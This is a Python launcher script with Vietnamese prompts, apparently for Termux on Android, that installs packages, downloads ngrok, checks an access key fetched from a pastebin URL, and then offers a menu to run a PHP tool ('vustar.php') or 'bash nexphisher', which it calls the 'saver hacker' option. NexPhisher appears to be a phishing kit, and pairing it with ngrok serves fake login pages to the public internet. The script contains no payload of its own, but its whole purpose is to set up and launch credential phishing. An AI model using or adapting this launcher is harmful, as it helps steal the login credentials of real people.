import os,sys,re,json
print('Hãy đảm bảo rằng mạng của bạn ổn đinh!')
print("Hacker sẽ yêu cầu cấp quyền nếu bạn là người mới!!")
ip=input("Bạn là người mới hay cũ [moi] hay [cu]: ")
if ip == 'moi':
    os.system('termux-setup-storage')
    os.system('pip install requests')
    os.system('pkg update')
    os.system('pkg upgrade')
    os.system('pkg install wget')
    os.system('wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip')
    os.system('pkg install php')
    os.system('pkg install curl')
    os.system('apt upgrade')  
#     os.system('bash setup')
#     os.system('bash tmux_setup')
    os.system('clear')
########################################################
    print('Cài đặt hoàn tất!!')
    import requests
    saver_1=requests.get('https://pastebin.com/raw/gs1sP0JG').text
    saver_2=input("Nhập id saver: ")
    if saver_2 == saver_1:
            print("Saver hoạt động")
    else:
        print("saver ngừng hoạt động!!!")
        exit()
    print('Bạn muốn:')
    print('Nhập [1] Truy cập tool tds')
    print('Nhập [2] Truy cập saver hacker')
    
#######################################################

    nhap=input('Nhập: ')
    if nhap == '1':
        os.system('php vustar.php')
    if nhap == '2':
        os.system('bash tmux_setup')
        os.system('bash setup')
        os.system('bash nexphisher')
############################################################################################    
if ip == 'cu':
    os.system('clear')
    import requests
    saver_1=requests.get('https://pastebin.com/raw/gs1sP0JG').text
    saver_2=input("Nhập id saver: ")
    if saver_2 == saver_1:
            print("Saver hoạt động")
    else:
        print("saver ngừng hoạt động!!!")
        exit()
    print('Nhập [1] Truy cập tool tds')
    print('Nhập [2] Truy cập saver hacker')
    nhap=input('Nhập: ')
    if nhap == '1':
        os.system('php vustar.php')
    if nhap == '2':
        os.system('bash nexphisher')          
